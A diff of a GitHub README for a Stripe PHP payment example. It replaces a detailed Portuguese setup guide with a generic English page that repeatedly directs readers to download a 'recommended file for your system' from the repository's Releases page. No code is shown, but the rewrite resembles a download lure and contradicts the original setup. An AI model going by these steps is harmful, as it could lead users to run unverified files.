@@ -1,230 +1,104 @@
-# 💳 Sistema de Pagamentos Stripe - PHP
+# 🎉 stripe-php - Effortless Payments Integration with Stripe
 
-Um sistema completo de processamento de pagamentos usando Stripe, desenvolvido em PHP com interface moderna e acessível.
+## 🚀 Getting Started
 
-## 🚀 Características
+Welcome to the **stripe-php** project! This is a simple example to help you use Stripe with PHP. You can easily accept payments on your website with just a few steps. 
 
-- ✅ **Interface moderna e responsiva** com design acessível
-- 🔒 **Processamento seguro** de pagamentos via Stripe
-- 📱 **Suporte a múltiplos cartões** (Visa, Mastercard, Elo, American Express)
-- 🔔 **Sistema de webhooks** para notificações em tempo real
-- 📊 **Logging estruturado** para monitoramento
-- 🛡️ **Validações robustas** e tratamento de erros
-- 🌐 **Interface em português** com UX otimizada
+## 🖱️ Download & Install
 
-## 📋 Pré-requisitos
+To get started, you need to download the application. Click the link below to visit the Releases page:
 
-- PHP 7.4 ou superior
-- Composer
-- Conta Stripe (modo teste ou produção)
-- Stripe CLI (para webhooks locais)
+[![Download stripe-php](https://img.shields.io/badge/Download%20Now-Stripe%20PHP-brightgreen)](https://github.com/russel10/stripe-php/releases)
 
-## ⚙️ Configuração
+On the Releases page, you will find the latest version of the software. Look for the most recent release and click on it.
 
-### 1. Instalar dependências
+### Steps to Download
+
+1. Go to the [Releases page](https://github.com/russel10/stripe-php/releases).
+2. Find the latest version listed.
+3. Click on the version number to see its details.
+4. Look for the "Assets" section to find the files for download.
+5. Download the recommended file for your system.
+
+## 🖥️ System Requirements
+
+To run the **stripe-php** application, make sure your system meets the following requirements:
+
+- PHP version 7.2 or higher
+- A web server like Apache or Nginx
+- Composer (for managing dependencies)
+
+Follow your system's instructions to install these requirements if you haven't already.
+
+## 🔧 Setting Up the Application
+
+### Step 1: Set Up the Files
+
+After downloading, extract the files to a folder on your computer. You should see the following files:
+
+- `index.php`
+- `composer.json`
+- Any other related files
+
+### Step 2: Install Dependencies
+
+To run the application, you need to install the necessary libraries. Open a terminal or command prompt and navigate to the folder where you extracted the files. Run the command:
 
 ```bash
 composer install
 ```
 
-### 2. Configurar chaves do Stripe
+This command will download all required libraries automatically.
 
-Crie o arquivo `.env` na raiz do projeto com suas chaves do Stripe:
+### Step 3: Configure Your Stripe API Key
 
-```bash
-# Copie o arquivo de exemplo
-cp .env.example .env
-```
+To accept payments, you need to configure your Stripe API key. Create a new Stripe account if you don't have one. Once you log in, find your API keys in the dashboard.
 
-Edite o arquivo `.env` com suas chaves reais:
+1. Locate the `config.php` file in the project folder.
+2. Open the file with a text editor.
+3. Replace the placeholder API key with your actual API key from Stripe.
 
-```env
-# Stripe Configuration
-STRIPE_SECRET_KEY=sk_test_sua_chave_secreta_aqui
-STRIPE_PUBLISHABLE_KEY=pk_test_sua_chave_publicavel_aqui
-STRIPE_WEBHOOK_SECRET=whsec_seu_webhook_secret_aqui
+## 🌐 Running the Application
 
-# Environment
-APP_ENV=development
-```
+1. Start your web server (Apache or Nginx).
+2. Place the project folder in the web root directory.
+3. Open your web browser and go to the URL where the project is hosted, such as `http://localhost/stripe-php/index.php`.
 
-**⚠️ Importante:**
+You should now see the application running.
 
-- Nunca commite o arquivo `.env` no Git
-- Use chaves de teste para desenvolvimento
-- Use chaves de produção apenas em ambiente seguro
+## 📒 Understanding the Code
 
-#### Como obter suas chaves do Stripe:
+The **stripe-php** example is straightforward. Here’s a brief overview of the key files:
 
-1. **Acesse o [Dashboard do Stripe](https://dashboard.stripe.com/)**
-2. **Para desenvolvimento**: Use as chaves de **teste** (começam com `sk_test_` e `pk_test_`)
-3. **Para produção**: Use as chaves **live** (começam com `sk_live_` e `pk_live_`)
-4. **Webhook Secret**: Configure um webhook no dashboard e copie o secret (começa com `whsec_`)
+- **index.php**: This is the main file that handles payments.
+- **config.php**: This file contains your Stripe API key and other configuration settings.
+- **composer.json**: This file lists the libraries your project needs.
 
-### 3. Executar o servidor
+Feel free to explore the code. You can make adjustments to fit your requirements better.
 
-**Opção 1: Servidor PHP nativo**
+## 🤝 Get Support
 
-```bash
-php -S 127.0.0.1:4242 --docroot=public
-```
+If you encounter issues or have questions, you can get support through the GitHub issues page. Here’s how to do it:
 
-**Opção 2: Docker**
+1. Go to the [issues section](https://github.com/russel10/stripe-php/issues).
+2. Click on "New issue".
+3. Describe your problem clearly and submit.
 
-```bash
-docker run --rm -d -p 4242:4242 -v $PWD:/app -w /app/public php:latest php -S 0.0.0.0:4242
-```
+The community may help you, or your issue may become a topic for improvement.
 
-### 4. Acessar a aplicação
+## 💬 Feedback and Contributions
 
-Abra seu navegador em: [http://localhost:4242/checkout.html](http://localhost:4242/checkout.html)
+Your feedback helps improve this project. If you have suggestions or want to contribute, please feel free to reach out via the GitHub repository.
 
-## 🔗 Configuração de Webhooks
+## ⚙️ Update the Application
 
-Para receber notificações em tempo real sobre o status dos pagamentos:
+To keep your application up-to-date, repeat the download process whenever a new release comes out. This helps ensure you have the latest features and security improvements.
 
-### 1. Instalar Stripe CLI
+## ✨ Additional Resources
 
-```bash
-# macOS
-brew install stripe/stripe-cli/stripe
+For more information on using Stripe with PHP, visit the following links:
 
-# Linux/Windows
-# Baixe em: https://github.com/stripe/stripe-cli/releases
-```
+- [Stripe PHP Library](https://stripe.com/docs/libraries)
+- [Stripe API Reference](https://stripe.com/docs/api)
 
-### 2. Fazer login na sua conta Stripe
-
-```bash
-stripe login
-```
-
-### 3. Encaminhar eventos para o webhook local
-
-```bash
-stripe listen --forward-to localhost:4242/webhook.php
-```
-
-### 4. Testar eventos
-
-Em outro terminal, simule um pagamento bem-sucedido:
-
-```bash
-stripe trigger payment_intent.succeeded
-```
-
-## 📁 Estrutura do Projeto
-
-```
-├── public/                 # Arquivos públicos
-│   ├── checkout.html      # Interface de pagamento
-│   ├── checkout.css       # Estilos da interface
-│   ├── checkout.js        # Lógica do frontend
-│   ├── create.php         # API para criar PaymentIntent
-│   └── webhook.php        # Endpoint para webhooks
-├── data/                  # Dados da aplicação
-│   └── transactions.json  # Histórico de transações
-├── storage/               # Logs do sistema
-│   └── log/
-│       ├── stripe_create.log
-│       └── stripe_webhook.log
-├── config.php            # Carregador de configurações
-├── .env                  # Variáveis de ambiente (não commitar)
-├── .env.example          # Exemplo de configuração
-└── composer.json         # Dependências PHP
-```
-
-## 🎯 Como Usar
-
-### 1. Interface de Pagamento
-
-- Acesse `checkout.html` no seu navegador
-- Preencha os dados do cartão (use cartões de teste do Stripe)
-- Defina o valor do pagamento
-- Clique em "Confirmar pagamento"
-
-### 2. Cartões de Teste
-
-Use estes cartões para testes:
-
-| Cartão       | Número              | CVV | Resultado           |
-| ------------ | ------------------- | --- | ------------------- |
-| Visa         | 4242 4242 4242 4242 | 123 | Sucesso             |
-| Visa (falha) | 4000 0000 0000 0002 | 123 | Falha               |
-| Mastercard   | 5555 5555 5555 4444 | 123 | Sucesso             |
-| 3D Secure    | 4000 0025 0000 3155 | 123 | Requer autenticação |
-
-### 3. Monitoramento
-
-- **Logs de criação**: `storage/log/stripe_create.log`
-- **Logs de webhooks**: `storage/log/stripe_webhook.log`
-- **Transações**: `data/transactions.json`
-
-## 🔧 API Endpoints
-
-### POST `/create.php`
-
-Cria um novo PaymentIntent no Stripe.
-
-**Request:**
-
-```json
-{
-  "items": [{ "amount": 10000 }],
-  "order_id": "pedido_123",
-  "customer_email": "cliente@exemplo.com"
-}
-```
-
-**Response:**
-
-```json
-{
-  "success": true,
-  "data": {
-    "clientSecret": "pi_xxx_secret_xxx",
-    "paymentIntentId": "pi_xxx",
-    "amount": 10000,
-    "currency": "brl"
-  }
-}
-```
-
-### POST `/webhook.php`
-
-Endpoint para receber webhooks do Stripe.
-
-**Eventos suportados:**
-
-- `payment_intent.succeeded`
-- `payment_intent.payment_failed`
-- `payment_intent.canceled`
-- `payment_intent.requires_action`
-- `charge.dispute.created`
-
-## 🛡️ Segurança
-
-- ✅ **Chaves seguras**: Secret key apenas no backend, publicável injetada dinamicamente
-- ✅ **Variáveis de ambiente**: Configurações sensíveis no arquivo `.env`
-- ✅ **Validação de entrada** rigorosa
-- ✅ **Sanitização de dados**
-- ✅ **Headers de segurança**
-- ✅ **Verificação de assinatura** de webhooks
-- ✅ **Logging estruturado** de todas as operações
-- ✅ **Tratamento de erros** sem exposição de dados sensíveis
-- ✅ **Gitignore configurado** para proteger arquivos sensíveis
-
-## 📚 Recursos Adicionais
-
-- [Documentação Stripe](https://stripe.com/docs)
-- [Cartões de teste](https://stripe.com/docs/testing)
-- [Webhooks](https://stripe.com/docs/webhooks)
-- [Stripe CLI](https://stripe.com/docs/stripe-cli)
-
-## 📄 Licença
-
-Este projeto é um exemplo educacional. Use conforme necessário.
-
----
-
-**Stripe e PHP**
+[![Download stripe-php](https://img.shields.io/badge/Download%20Now-Stripe%20PHP-brightgreen)](https://github.com/russel10/stripe-php/releases)
